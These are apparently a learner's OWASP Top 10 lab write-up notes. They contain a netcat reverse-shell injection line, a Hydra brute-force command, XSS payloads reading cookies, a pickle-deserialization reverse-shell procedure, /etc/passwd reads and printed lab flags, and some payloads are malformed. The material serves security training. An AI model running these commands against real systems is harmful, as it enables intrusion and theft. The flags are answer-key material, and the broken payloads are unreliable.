OWASP_TOP_10
############
:Author: David Boyd
:Date: 2020-10-20
:PHP: https://www.php.net/
:Reverse Shells: https://cyberwarzone.com/reverse-shell-cheat-sheet/
:PHP passthru: https://www.php.net/manual/en/function.passthru.php

INJECTION
**********
:Day 1: Task 4

active command injection
	returns the response to the user  // can *see the response*
	(made visible through several HTML elements)
	#compare(blind command injection)

blind command injection
	occurs when a command injection (system command made to the server) does
	not return the response to the use in the HTML document. // *!=seeResponse*
	#compare(active command injection)

command injection
	input is passed to system commands

	[+] Access to users' systems

		- access to data
		- carry out more attacks against infrastructure linked to the server
		  on which the command is executed.

	[+] occurs when server-side code (like PHP) in a web application makes a
		system call on the hosting machine.

	- types(active, blind)

	[+] whoami -> ;nc -e /bin/bash (reverse shells)

PHP passthru
	executes what gets entered into the input
	then passing thr output back to the browser

PHP try-catch
	[+] PHP != output of stderr, but
	[+] PHP requires a 'catch' when using a 'try' statement


SQL Injection
	controlled input is passed to SQL queries
	[+] Access, Modify, and Delete information in a database


Prevention
==========

1.	Input validation
		a.	allow list
				- input is cmp to a list of safe input/chars
		b.	stripping input
				- rm dangerous chars (any input that can change how the
									  underlying data is processed).

		[+] There are libraries that perform these actions for you.

Injection Commands
==================

+-------------------+-------------+
| Linux             | Windows     |
+===================+=============+
| whoami            | whoami      |
+-------------------+-------------+
| id                | ver         |
+-------------------+-------------+
| ifconfig /ip addr | ipconfig    |
+-------------------+-------------+
| uname -a          | tasklist    |
+-------------------+-------------+
| ps -ef            | netstat -an |
+-------------------+-------------+
| cat cat/passwd    |             |
+-------------------+-------------+

id
	displays the current user's UID, GID, and Groups

Walkthrough
===========

#1.	What strange text file is in the website root directory?

	- Actions: 10.10.109.209/evilshell.php
	- Command: ls
	- ANSWER: drpepper.txt

#2.	How many non-root/non-service/non-daemon users are there?

	- ACTIONS: https://linuxize.com/post/how-to-list-users-in-linux/
	- COMMAND: grep -E '^UID_MIN|^UID_MAX' /etc/login.defs
	- COMMAND: getent passwd {1000..60000}
	- COMMAND: cat /etc/passwd
	- ANSWER: 0

#3. What user is this app running as?

	- COMMAND: whoami
	- ANSWER: www-data

#4. What is the user's shell set as?

	- INFO: User's shell is the last ':' parameter (NOTE:$USER has 2!)
	- COMMAND: cat /etc/passwd/ | grep www
	- ANSWER: /usr/sbin/nologin

#5. What version of Ubuntu is running?

	- INFO: LSB (Linux Standard Base) holds info about your *specific* distro
	- COMMAND: lsb_release - a
	- ANSWER: 18.04.4

#6. Print out the MOTD.  What favorite beverage is shown?

	- MOTD: The */etc/motd/* is a file that contains a "message of the day"
	- MOTD: Used to send a common message to all users efficiently > email
	- COMMAND: cat /etc/motd	**DOES NOT WORK!**
	- RESOLUTION: deduction of Q#1 && num of char placeholders in answer
	- ANSWER: Dr Pepper

Used with hint: 00-header

.. code-block:: Bash

	ls /etc/update-motd.d/
	# 00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm
	# 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades
	# 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required
	cat /etc/updated-motd.d/00-header
	#ANSWER: " DR PEPPER MAKES THE WORLD TASTE BETTER! "

Broken Authentication
*********************
:Day 2: Task 7-8

Authentication and session management constitute core components of modern web
applications.  Authentication allows users to gain access to web applications
by veriftying their identities.  The most common form of authentication is
using a username and password mechanism.  A user would enter these credentials,
ther server would verify them.  If they are correct, the server would then
provide ther users' browser with a session cookie.  A session cookie is needed
because web servers use HTTP(S) to communicate which is stateless.  Attaching a
session cookies means that the server will know who is sending what data.  The
server can then keep track of user' actions.

If an attacker is able to find flaws in an authentication mechanism, they would
then succe4ssfully gain access to other users' accounts.  This would allow the
attacker to access sensitive data (depending on the purpose of the
application).  Some common flaws in authentication mechanisms include:

	- Brute force attacks: If a web application uses usernames and passwords,
	  an attacker is able to launch brute force attacks that allow them to
	  guess the username and passwords using multiple authentication attempts.
	- Use of weak credentials: web applications should set strong password
	  policies.  If applications allows users to uset passwords such as
	  'password1' or common passwords, then an attacker is able to easily guess
	  them and access user accounts.  They can do this without brute forcing
	  and without multple attempts.
	- Weak Session Cookies; Session cookies are how the server keeps track of
	  users.  If session cookies contain predictable values, an attacker can
	  set their own session cookies and access user' accounts.

There can be various mitigation for broken authentication mechanisms depending
on the exact flaw:

	- To avoid password guessing attacks, enusre the application enforces a
	  strong password policy.
	- To avoid brute force attacks, ensure that the application enforces an
	  automatic lockout after a certain number of attempts.  This would prevent
	  an attacker from launching more brute force attacks.
	- Implement Multi Factor Authentication - If a user has mutliple mehtods of
	  authentication and receiving a code on their mobile device, then it would
	  be difficult for an attacker to get access to both credentials to get
	  access to their account.

Broken Authentication Practical
===============================

For this example, we'll be looking at a **logic flaw** within the
authentication mechanism.

A lot of times what happens is that developers forget to sanitize the input
(username & password) given by the user in the code of their application, which
can make them vulnerable to attacks like SQLi.  However, we are going to focus
on a vulnerability that happens because of a developer's mistake but is very
easy to exploit.  I.e) Re-registration of an existing user.

Let's under this with the help of an example, say there is an existing user
with the name **admin** and now we want to get access to their account so what
we can do is try to re-register that username but with slight modification.  We
are going to enter " admin" (notice the space in the starting).  Now when you
enter that in the username field and enter other required information like
email id or password and submit that data.  It will actaully register a new
user but that user will have the same right as normal admin.  That new user
will also be able to see all the content presented under the user **admin**.

To see this in action go to http://$TM:8888 and try to register a username
**darren**, you'll see that user already exists, so then try to register a user
**" darren"** and you'll see that you are now logged in and will be able to see
the content present only in Darren's account which in our case is the flag that
you need to retrieve.

Walkthrough
===========
:Fun Notes: you can login as " admin" with re-registered password.

+---+---------------------------------+----------------------------------+
| # | Question                        | Answer                           |
+===+=================================+==================================+
| 1 | What is the flag that you found | fe86079416a21a3c99937fea8874b667 |
|   | in darren's account?            |                                  |
+---+---------------------------------+----------------------------------+
| 2 | Now try to do the same trick    | [Completed]                      |
|   | and see if you can login as     |                                  |
|   | **arthur**                      |                                  |
+---+---------------------------------+----------------------------------+
| 3 | What is the flag that you found | d9ac0f7db4fda460ac3edeb75d75e16e |
|   | in arthur's account?            |                                  |
+---+---------------------------------+----------------------------------+

[Day 3] Sensitive Data Exposure
*******************************

Introduction
============

sensitive data exposure
	when a webapp divulges sensitive data.
	[+] customer data

			- names
			- DOB
			- financial information
			- etc

	[+] technical data
			- usernames
			- passwords

Supporting Material 1
=====================
:Scope: flat-file DB
:Database engines: SQL, NoSQL (alternative format)
:DB Locations: dedicated servers (MySQL, MariaDB)
:Flat-file DB: sqlite (most common)

Database
	most common way to store a large amount of data in a format that is
	easily accessible from many locations at once.


flat-file database
	a database that is stored as a single file on the computer.
	[+] easier setup > full DB server ::> common in smaller webapps.


| if (DB is stored underneath the root dir of the website) {
| // one of the files that a user connecting to website can access
| db = download(flat-filedb);
| // query DB with full access to EVERYTHING in DB
| sde = query(db);	// sde = sensitive data exposure
| return sde;
| }

sqlite
	most common and simplest flat-file database.
	[+] can be interacted with most programming languages

sqlite3
	a dedicated client for querying sqlite on the command line.
	[+] CLI for SQLite3
	[+] installed by default on Kali
	[+] sqlite - CLI for SQLite 2

SQLite syntax
-------------

+-----------------------------+------------------------+
| SQLite Cmd                  | Description            |
+=============================+========================+
| sqlite3 <file>              | access the DB          |
+-----------------------------+------------------------+
| .tables                     | view the table names   |
+-----------------------------+------------------------+
| PRAGMA table_info(<file>)   | view column names      |
+-----------------------------+------------------------+
| SELECT * FROM <.tablesName> | dump table information |
+-----------------------------+------------------------+

.. code-block:: Bash

	# determine file type
	file <db-name>.db

	# access SQLite db
	sqlite3 <db-name>

	# see the .tables
	sqlite> .tables
	<tableName>

	# view table info (col names)
	sqlite> PRAGMA table_info(<tableName>);

	# example output
	0|custID|INT|1||1				// col 1
	1|custName|TEXT|1||0			// col 2
	2|creditCard|TEXT|0|0			// col 3
	3|password|TEXT|1|0				// col 4

	# dump information from the table
	sqlite> SELECT * FROM customers;

	# example output
	0|Joy Paulson | 4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
	1|John Walters|5298 0704 2379 5940|f806fc5a2a0d5ba2471600758452799c
	...
	...


+---------------+------------------------------------+
| Column Name   | Information                        |
+===============+====================================+
| custID        | (0)                                |
+---------------+------------------------------------+
| custName      | (Joy Paulson)                      |
+---------------+------------------------------------+
| creditCard    | (4916 9012 2231 7905)              |
+---------------+------------------------------------+
| password hash | (5f4dcc3b5aa765d61d8327deb882cf99) |
+---------------+------------------------------------+

[Day 3] Sensitive Data Exposure Supporting Material 2
=====================================================
:About: Password Hashes
:URL: https://crackstation.net

Crack password hashes
---------------------

	- Kali comes pre-installed with a bunch of hash cracking tools
	- this scope will be using Crackstation's online tool

This scope uses weak MD5 hashes.

[Day 3] Sensitive Data Exposure (Challenge)
===========================================

[Day 6] Security Misconfiguration (Challenge)
=============================================

What you've learned:

	- **Python's Request Module**
	- Reading HTTP headers and JS
	- Burp Suite (reading headers and shit) (Hydra is faster!!!)
	- Locating and downloading wordlists
	- Hydra (online dictionary attack)
		- Find the HTTP Response for <Login-URL> either through:
			- Firefox > Network
			- Burp Suite

.. code-block:: bash

		hydra -L usernames.txt -P passwords.txt $TM http-post-form \
		"/api/user/login:username=^USER^&password=^PASS^:F=Incorrect" \
		-t 64 -I

[Day 7] Cross-site Scripting
============================

XSS Challenge
=============

The VM attached to this task showcases DOM-Based, Reflected and Stored XSS.
Deploy the machine and exploit each type!

#1 Deploy the VM
-----------------

[Completed]

#2 Go to http://$TM/reflected and craft a reflected XSS payload that will cause a popup saying "Hello".
-------------------------------------------------------------------------------------------------------

.. code-block:: JavaScript

	<script>alert("Hello")<script>

#3 On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
--------------------------------------------------------------------------------------------------------------------

:Note: Your deployed machine's hostname will be its IP (Not your public IP)

.. code-block:: JavaScript

	<script>alert<window.location.hostname></script>

#4 Now navigate to http://$TM/stored and make an account.  Then add a comment and see if you can insert some of your own HTML.
------------------------------------------------------------------------------------------------------------------------------

Using document.write() after an HTML document is fully loaded, will
delete all existing HTML. (I had to restart the $TM!!!)  Reference:
https://www.w3schools.com/jsref/met_doc_write.asp

.. code-block:: HTML

	<h1><strong>OMFG!</br>ALL I HAD TO DO WAS USE F*ING <EM>TAGS</EM></h1>

#5 On the same page, create an alert popup box appear on the page with your document cookies.
---------------------------------------------------------------------------------------------
:URL: https://www.w3schools.com/jsref/prop_doc_cookie.asp

.. code-block:: JavaScript

	<script>alert(document.cookie)</script>

#6 Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.""""""
---------------------------------------------------------------------------------------------

documentquerySelector() method
	returns the first element that matches a specified *CSS selector(s)* in the
	document.
	TO return all matches, use document.querySelectorAll() method.

document.getElementById() method
	returns the element that has the ID attribute with the specified value.
	If >1 ID exists, getElementId() method returns the first element in the
	source code.

.. code-block:: JavaScript

	# THM's solution:
	<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>

	# My crafted solution from w3schools.com
	<Script>document.getElementById("thm-title").innerHTML = "I am a hacker"</script

[Severity 8] Insecure Deserialization
*************************************

Cookies Practical
=================

#1 1st flag (cookie value)
--------------------------

Inspecting Encoded Data
You will see here that there are cookies are both plaintext encoded and base64
encoded. The first flag will be found in one of these cookies.

.. code-block:: Bash

	# Copy and Paste Storage > Cookies > sessionId > Value
	# Decode with base64
	echo 'gAN9cQAoW...Lg==' | base64 --decode

#2 2nd flag (admin dashboard)
-----------------------------

Modifying Cookie Values
Notice here that you have a cookie named "userType". You are currently a user,
as confirmed by your information on the "myprofile" page.

This application determines what you can and cannot see by your userType. What
if you wanted to be come an admin?

	Double left-click the "Value" column of "userType" to modify the contents.
	Let's change our userType to "admin" and navigate to
	http://$TM/admin to answer the second flag.

Code Execution
==============
:Summary: Encodeing a reverse shell through Python's Flask web application
vulnerability of cookie setting in base64.

**IMPORTANT NOTES USING WSL**

	- In order to invoke a reverse shell of any kind, your VPN must be set through
WSL --otherwise Kali won't detect OpenVPN's adapter & IP address.

	- don't use netcat's '-p' flag when selecting a specific netw adapter.

1.	Get Python's pickle encoding code from

https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3

2.	Input your OpenVPN's IP address; THEN run prgm.
3.	Copy output (cookie value)
4.	Setup netcat listening

.. code-block:: Bash

	nc -nvl OVPN.IP.ADDR 4444

5.	On TM

	- click 'Exchange your vim' to obtain the encoded cookie
	- change the encoded cookie's value to the copied rce.py's output
	- click 'Provide your feedback' to deserialize your RemoteShell's code

6.	On kali -l

	- patiently wait

.. code-block:: Bash

	find / -iname flag.txt 2>/dev/null


[Severity 9] Components With Known Vulnerabilities
**************************************************

How To Solve
============

1.	Deploy and browse to machine's website
2.	Copy 'Online CSE Bookstore' and google search "'<copy>' exploit"
3.	Download python file (note: bookstore == book store)
4.	python3 exploit.py http://$TM
5.	wc -c /etc/passwd

#1 How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
-----------------------------------------------------------------------------------
:ANS: 1611

